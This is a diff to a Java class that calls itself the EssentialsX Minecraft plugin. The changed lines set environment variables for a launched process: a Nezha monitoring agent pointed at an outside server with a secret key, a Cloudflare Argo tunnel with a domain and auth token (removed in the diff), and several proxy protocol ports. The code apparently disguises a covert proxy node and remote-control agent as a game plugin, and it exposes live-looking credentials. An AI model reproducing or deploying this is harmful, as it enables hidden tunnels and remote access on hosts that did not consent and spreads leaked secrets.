@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "66d1207e-f2cf-417c-8619-f50f4e6e51b6");
+        env.put("UUID", "efcdedbb-95ef-413b-9d84-8c83ed3e093b");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nzag.faiz.us.kg:8008");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "altare-gb.kaixa.xx.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiOTExODg5ZjctZGJmMC00MDY0LTgzYzItNGMyOWY1YmJjY2FjIiwicyI6Ik5HTXhZek0zTldVdFltWTNOQzAwTkdabExUaGhZamt0WkdSbU5qWm1Nalk1TW1FMiJ9");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25058");
+        env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "GB-Altare");
+        env.put("NAME", "DE-Gameserver");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
